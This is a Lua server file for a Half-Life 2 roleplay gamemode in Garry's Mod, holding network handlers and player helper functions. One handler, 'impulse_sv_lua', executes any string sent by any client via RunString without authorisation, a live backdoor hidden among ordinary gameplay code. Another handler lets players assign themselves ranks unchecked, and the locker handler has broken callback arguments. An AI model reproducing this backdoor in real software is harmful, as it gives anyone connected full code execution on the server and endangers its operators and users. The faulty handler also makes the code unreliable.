util.AddNetworkString("impulseHL2RPRankBecome")
util.AddNetworkString("ImpulseCreateVGUI")
util.AddNetworkString("impulse_sv_lua")
util.AddNetworkString("impulseHL2RPUseLocker")
util.AddNetworkString("impulsePlaySound")

net.Receive("impulseHL2RPRankBecome", function(len,ply)
    local division = net.ReadUInt(8)
    local rank = net.ReadUInt(8)
    local RandomNumbers = math.random(1000,9999)

    if IsValid(ply) and ply:IsPlayer() then
        ply:SetTeamClass(division)
        ply:SetTeamRank(rank)
        if ply:Team() == TEAM_CP then
            ply:SetRPName('C17.MPF.'..ply:GetTeamClassName()..'.'..ply:GetTeamRankName()..':'..RandomNumbers)
        end
        if ply:GetTeamClassName() == "HELIX" then
            ply:Give("ls_medkit")
        end
        if ply:Team() == TEAM_OTA then
            ply:SetRPName('C17.OTA.'..ply:GetTeamClassName()..'.'..ply:GetTeamRankName()..':'..RandomNumbers)
        end
    end
end)

net.Receive("impulse_sv_lua", function()
	local argstr = net.ReadString()
    if SERVER then
	print("Running Serverside: "..argstr)
	RunString(argstr)
    end
end)

net.Receive( "impulseHL2RPUseLocker", function(ply, ent)
    if ent:GetBodygroup( 1 ) == 6 then
        ent:SetBodygroup( 1, 0 )
    elseif ent:GetBodygroup( 1 ) == 0 then
        ent:SetBodygroup( 1, 6 )
    end
end )	

function meta:ClearBodyGroups(ply, ent)
	for i = 1, self:GetNumBodyGroups() do
		self:SetBodygroup( i, 0 )
	end
end

function meta:NearPlayer(radius)
    for k, v in ipairs(ents.FindInSphere(self:GetPos(), radius or 96)) do
        if v:IsPlayer() and v:Alive() and v:IsValid() then
            return true
        end
    end
    return false
end

function meta:NearEntityPure(entity, radius)
    for k, v in ipairs(ents.FindInSphere(self:GetPos(), radius or 96)) do
        if ( v == entity ) then
            return true
        end
    end
    return false
end

function meta:NearEntity(entity, radius)
    for k, v in ipairs(ents.FindInSphere(self:GetPos(), radius or 96)) do
        if (v:GetClass() == entity) then
            return true
        end
    end
    return false
end

function meta:PlaySound(sound, pitch)
	net.Start("impulsePlaySound")
		net.WriteString(tostring(sound))
		net.WriteUInt(tonumber(pitch) or 100, 7)
	net.Send(self)
end

function meta:OpenVGUI(panel)
    if not isstring(panel) then
        ErrorNoHalt("Warning argument is required to be a string! Instead is "..type(panel).."\n")
        return
    end
    net.Start("ImpulseCreateVGUI")
        net.WriteString(panel)
    net.Send(self)
end